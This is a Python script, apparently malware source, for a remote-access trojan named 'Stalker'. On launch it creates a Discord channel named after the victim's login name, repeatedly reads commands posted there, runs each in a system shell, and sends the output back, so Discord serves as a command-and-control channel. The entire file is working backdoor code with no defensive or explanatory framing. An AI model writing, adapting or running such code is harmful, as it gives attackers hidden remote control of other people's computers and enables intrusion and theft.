import os
import time
import requests
import subprocess



class Stalker:
    def __init__(self):
        self.running = True

        # Discord token
        self.discord_token = "" 
        # Discord Server link
        self.DiscordServer_url = ""


        self.Shell_url = ""
        self.ShellDelay_sec = 10


        self.Username = os.getlogin()
        self.Headers = {"Authorization": self.discord_token}
    

    def Shell(self):
        while self.running:
            try:
                time.sleep(self.ShellDelay_sec)
                res = requests.get(self.Shell_url + "?limit=1", headers=self.Headers)
                command = res.json()[0]["content"]

                if command == "quit":
                    self.running = False
                    self.SendText("<shell>bye my friend, hopefully i see u soon :)", self.Shell_url)
                elif command.startswith("<shell>"):
                    pass
                elif command.startswith("cd"):
                    os.chdir(command[3:])
                    self.SendText("<shell>" + command, self.Shell_url)
                elif len(command) > 0:
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    if len(stdout_value) > 1900:
                        stdout_value = stdout_value[0:1900]

                    self.SendText((b"<shell>" + stdout_value).decode("cp850"), self.Shell_url)
            except:
                pass

    
    def SendText(self, text, url):
        data = {"content": text}
        requests.post(url, headers=self.Headers, data=data)


    def MakeChannel(self, name):
        payload = {
            "guild_id": "1246153061517234236",
            "name": name,
            "type": 0
        }
        requests.post(self.DiscordServer_url, json=payload, headers=self.Headers)


    def MakeUrl(self, number):
        return f"https://discord.com/api/v9/channels/{number}/messages"


    def GiveChannelToVar(self):
        r = requests.get(self.DiscordServer_url, headers=self.Headers)

        for pp in r.json():
            if pp["type"] == 0:
                n = pp["name"]

                if n == f"{self.Username}-shell":
                    self.Shell_url = self.MakeUrl(pp["id"])

    
    def FindChannelUrl(self):
        r = requests.get(self.DiscordServer_url, headers=self.Headers)
        con = r.content.decode("utf-8")

        if con.find(f"{self.Username}-shell") == -1:
            self.MakeChannel(f"{self.Username}-shell")

        self.GiveChannelToVar()


    def start(self):
        self.FindChannelUrl()
        self.Shell()


Stalker().start()